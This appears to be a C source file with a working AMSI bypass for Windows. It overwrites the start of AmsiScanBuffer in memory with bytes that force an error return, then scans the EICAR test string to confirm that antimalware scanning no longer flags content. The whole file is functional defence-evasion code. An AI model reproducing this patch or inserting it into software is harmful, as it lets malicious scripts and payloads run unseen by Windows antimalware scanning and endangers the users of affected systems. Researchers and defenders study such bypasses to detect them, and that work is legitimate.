#include <windows.h>
#include <amsi.h>
#include <stdio.h>

typedef HRESULT(WINAPI* AMSIINITIALIZE)(LPCWSTR appName, HAMSICONTEXT* amsiContext);
typedef HRESULT(WINAPI* AMSISCANBUFFER)(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result);
typedef void (WINAPI* AMSIUNINITIALIZE)(HAMSICONTEXT amsiContext);

#define EICAR "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

BOOL DisableAMSI() {
    HMODULE dll;
    DWORD i = 0, op, t;
    PDWORD Signature;
    UCHAR _patchBytes[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    //UCHAR _patchBytes[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };

    dll = LoadLibraryA("amsi.dll");
    if (! dll) {
        return TRUE;
    }

    PBYTE mAmsiScanBuffer = (PBYTE)GetProcAddress(dll, "AmsiScanBuffer");

    if (mAmsiScanBuffer) {
        // set memory protection for write access
        if (VirtualProtect(mAmsiScanBuffer, sizeof(DWORD), PAGE_READWRITE, &op)) {
            SIZE_T pSize = sizeof(_patchBytes);
            SIZE_T numBytes = NULL;
            if (!WriteProcessMemory(GetCurrentProcess(), mAmsiScanBuffer, (PVOID)_patchBytes, pSize, &numBytes)) {
                printf("[!] Error: %lu\n", GetLastError());
                return FALSE;
            }
            // restore the memory back to original protection
            if (VirtualProtect(mAmsiScanBuffer, sizeof(DWORD), op, &t)) {
                return TRUE;
            }
        }
    }
    return FALSE;
}

int IsMalware() {
    AMSIINITIALIZE pAmsiInitialize;
    AMSISCANBUFFER pAmsiScanBuffer;
    AMSIUNINITIALIZE pAmsiUninitialize;
    HAMSICONTEXT ctx = NULL;
    AMSI_RESULT res;
    HMODULE amsi;
    HRESULT hr = -1;
    int malware = 2;

    printf("Loading Library\n");
    amsi = LoadLibraryA("amsi.dll");

    // resolve functions
    pAmsiInitialize = (AMSIINITIALIZE)GetProcAddress(amsi, "AmsiInitialize");
    pAmsiScanBuffer = (AMSISCANBUFFER)GetProcAddress(amsi, "AmsiScanBuffer");
    pAmsiUninitialize = (AMSIUNINITIALIZE)GetProcAddress(amsi, "AmsiUninitialize");

    if (!pAmsiInitialize || !pAmsiScanBuffer || !pAmsiUninitialize) {
        printf("Unable to resolve AMSI functions.\n");
        return 2;
    }

    printf("Initialized Library\n");
    printf("Scanning Memory using AmsiInitialize: %x\n", pAmsiInitialize);
    hr = pAmsiInitialize(L"AMSI Scanner v1.0", &ctx);
    if (hr == S_OK) {
        BYTE* sample = (BYTE*)EICAR;
        int eisize = strlen(EICAR);
        hr = pAmsiScanBuffer(ctx, sample, eisize, NULL, 0, &res);
        if (hr == S_OK) {
            malware = (AmsiResultIsMalware(res) || AmsiResultIsBlockedByAdmin(res));
        }
        else {
            printf("Error Initialize: 0x%08x\n", hr);
        }
        pAmsiUninitialize(ctx);
        printf("malware: %d\n", malware);
    }
    else {
        printf("Error Initialize: 0x%08x\n", hr);
        malware = 2;
    }

    return malware;
}

int main(int argc, char* argv[]) {
    if (!DisableAMSI()) {
        printf("unable to patch Amsi.\n");
        return 0;
    } else {
        printf("AMSI Patched\n");
    }

    getchar();

    int retval = IsMalware();
    if (retval == 0) {
        printf("SAFE");
    } else if (retval == 1) {
        printf("HARMFUL");
    } else {
        printf("Error");
    }
    return 0;
}
